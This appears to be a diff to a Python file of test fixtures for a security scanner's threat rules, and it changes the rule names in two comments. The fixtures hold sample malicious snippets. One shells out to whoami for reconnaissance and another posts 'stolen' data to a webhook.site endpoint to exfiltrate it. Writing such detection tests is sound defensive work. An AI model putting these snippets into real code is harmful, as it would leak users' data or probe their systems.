@@ -82,7 +82,7 @@ import moves
 exec_ = getattr(moves.builtins, "exec")
 ''')
 
-# 5. threat-process-sysinfo  (public rule: threat_process_spawn_sysinfo, via lolbas_sysinfo)
+# 5. threat-process-sysinfo  (public rule: threat_process_sysinfo)
 FIXTURES["threat-process-sysinfo"] = ("py", '''import subprocess
 # Recon: shelling out to system-info LOLBAS tools.
 subprocess.check_output(["whoami"])
@@ -238,7 +238,7 @@ def load_profile(path):
         return f.read()
 ''')
 
-# 16. threat-network-exfiltration  (public rule: threat_network_outbound)
+# 16. threat-network-exfiltration  (public rule: threat_network_exfiltration)
 FIXTURES["threat-network-exfiltration"] = ("py", '''import requests
 # Exfiltrate collected data to a throwaway webhook endpoint.
 requests.post("https://webhook.site/0000-dead-beef", json=stolen)
